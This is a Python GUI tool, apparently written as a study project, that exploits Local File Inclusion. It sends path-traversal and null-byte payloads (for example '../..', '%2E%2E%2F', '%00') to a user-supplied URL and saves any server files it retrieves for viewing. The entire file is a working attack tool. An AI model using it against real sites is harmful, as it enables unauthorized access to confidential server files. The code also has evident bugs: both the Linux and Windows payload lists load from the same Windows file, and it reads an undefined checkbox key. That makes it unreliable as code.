import os
import time
import requests
import PySimpleGUI as sg

sg.change_look_and_feel('BlueMono')

sg.set_options(font=('Courier New', 10))

BemVindo_layout = [
    [sg.Text('Bem-vindo!')],
    [sg.Text('Este programa é um resultado de um estudo realizado por Demetry Levy Kotrozinis para criação de uma ferramenta')],
    [sg.Text('que explora a vulnerabilidade de Local File Inclusion (LFI). Essa vulnerabilidade permite que um invasor')],
    [sg.Text('execute código malicioso por meio da inclusão de arquivos locais em uma página da web o que pode permitir um')],
    [sg.Text('invasor acessar arquivos confidenciais e sensíveis no servidor.')],
    [sg.Text('Para mais informações entre em contato a partir do email demetrylevy@gmail.com.')],
    [sg.Button('Continuar')]
]

janela = sg.Window('Kotrozinis Katalipsi', BemVindo_layout)

while True:
    
    evento, valores = janela.read()

    if evento == sg.WINDOW_CLOSED:
        break

    if evento == 'Continuar':
        janela.close()

sg.change_look_and_feel('BlueMono')

layout1 = [        
    [sg.Text('Digite abaixo a url com o parâmetro vazio:')],
    [sg.Input(size=(44,0),key='url')],
    [sg.Text('Selecione o payload:')],
    [sg.Radio('Linux','payloads',key='Linux'),
     sg.Radio('Linux bypass "../.."','payloads',key='linux_b1'),
     sg.Radio('Linux bypass "%2E%2E%2F"','payloads',key='linux_b2'),
     sg.Radio('Linux bypass "%00"','payloads',key='linux_b3')],

    [sg.Radio('Windows','payloads',key='Windows'),
     sg.Radio('Windows bypass "../.."','payloads',key='windows_b1'),
     sg.Radio('Windows bypass "%2E%2E%2F"','payloads',key='windows_b2'),
     sg.Radio('Windows bypass "%00"','payloads',key='windows_b3')
     ],
    [sg.Text('Defina o tempo em segundos entre as requisições:', visible=True)],
    [sg.InputText(size=(44,0),key='-INPUT-', visible=True)],
    [sg.Button('Iniciar exploit')]
]

diretorio = os.path.dirname(os.path.abspath(__file__))

with open('parametros_windows.txt', 'r') as arquivo:
    conteudo = arquivo.read().splitlines()
    params1 = conteudo


params3 = [ "../.." + param for param in params1 ]

params4 = [ "%2E%2E%2F%2E%2E%2F" + param for param in params1 ]

params5 = [param + "%00" for param in params1]


with open('parametros_windows.txt', 'r') as arquivo:
    conteudo = arquivo.read().splitlines()
    params2 = conteudo

params6 = [ "../.." + param for param in params2 ]

params7 = [ "%2E%2E%2F%2E%2E%2F" + param for param in params2 ]

params8 = [param + "%00" for param in params2]


janela1 = sg.Window("Kotrozinis Katalipsi").layout(layout1)

while True:

    evento, valores = janela1.read()

    url = valores['url']
    linux = valores['Linux']
    linux_b1 = valores['linux_b1']
    linux_b2 = valores['linux_b2']
    linux_b3 = valores['linux_b3']
    windows = valores['Windows']
    windows_b1 = valores['windows_b1']
    windows_b2 = valores['windows_b2']
    windows_b3 = valores['windows_b3']

    if linux == True:
        params = params1

    elif windows == True:
        params = params2

    elif linux_b1 == True:
        params = params3

    elif linux_b2 == True:
        params = params4

    elif linux_b3 == True:
        params = params5

    elif windows_b1 == True:
        params = params6

    elif windows_b2 == True:
        params = params7

    elif windows_b3 == True:
        params = params8

    if valores['-CHECKBOX-']:
            tempo = int(valores['-INPUT-'])
    
    urls2 = [url + param for param in params]

    url1 = url + "teste"

    response1 = requests.get(url1)

    if response1.status_code == 200:
            content1 = response1.text

    differences = []

    for url2 in urls2:

        time.sleep(tempo)

        filename2 = url2.split("/")[-1] + ".txt"

        response2 = requests.get(url2)

        if response2.status_code == 200:
            content2 = response2.text

        if "Failed opening" in content2 or (content1) == (content2) or len(content2) == 0:
            continue

        else:

            with open(filename2, "w", encoding='utf-8') as f:
                f.write(content2)

            if os.path.getsize(filename2) != 0 and filename2 not in differences:
                differences.append(filename2)

    layout2 = [
    [sg.Text("Selecione o arquivo que deseja visualizar:")], 
    [sg.Listbox(differences, size=(35, len(differences)), key="-LIST-")], 
    [sg.Button("Exibir Conteúdo", key="-SHOW-")],
    ]
    
    janela2 = sg.Window("Kotrozinis Katalipsi", layout2)

    if evento == sg.WINDOW_CLOSED:

        break

    elif evento == 'Iniciar exploit':

        while True:

            event, values = janela2.read()

            if event == sg.WIN_CLOSED:

                for file in differences:

                    if os.path.isfile(file):
                        os.remove(file)

                break

            elif event == "-SHOW-":
                
                nome_arquivo = values["-LIST-"][0]
                
                with open(os.path.join(diretorio, nome_arquivo), "r") as arquivo:
                    texto = arquivo.read()

                janela_texto = sg.Window("Kotrozinis Katalipsi", [[sg.Multiline(texto, size=(65, 30))]])
                
                while True:

                    event, _ = janela_texto.read()

                    if event == sg.WIN_CLOSED:
                        break
                
                janela_texto.close()


        janela2.read()

        janela2.close()

janela1.close()


